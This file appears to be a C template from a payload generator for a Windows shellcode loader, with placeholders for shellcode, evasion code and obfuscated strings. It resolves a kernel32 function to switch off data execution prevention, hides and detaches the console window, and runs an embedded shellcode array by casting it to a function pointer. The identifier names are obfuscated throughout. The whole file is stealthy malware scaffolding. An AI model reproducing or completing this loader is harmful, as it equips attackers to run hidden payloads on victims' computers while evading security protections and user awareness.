#define _WIN32_WINNT 0x0500
#define VAR10 0x00000000
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

VOID [FUNC_NAME](DWORD *VAR6, DWORD VAR7, CHAR **VAR8) {
        CHAR VAR5[] = "[CHARSET_ARRAY]";
        DWORD VAR9 = (VAR7 ^ VAR7) / VAR7;
        *VAR8 = (CHAR*)GlobalAlloc(GPTR, VAR7 + 1);
        for(VAR9; VAR9 < VAR7; VAR9++) {
                sprintf(*VAR8, "%s%c", *VAR8, VAR5[VAR6[VAR9]]);
        }
}
int main() {
        [FUNC_ARRAY]
        BOOL WINAPI(*VAR1)(DWORD);
        VAR1 = GetProcAddress(LoadLibrary([KERNEL32]), [DEP]);
        if(VAR1 != NULL) {
                VAR1(VAR10);
        }

        ShowWindow(GetConsoleWindow(), SW_HIDE);
        FreeConsole();
        char VAR3[] = "[SHELLCODE]";
	
	[EVASION]
		
        int(*VAR4)(void);
        VAR4 = (int(*)())VAR3;
        VAR4();
        return 0;
}
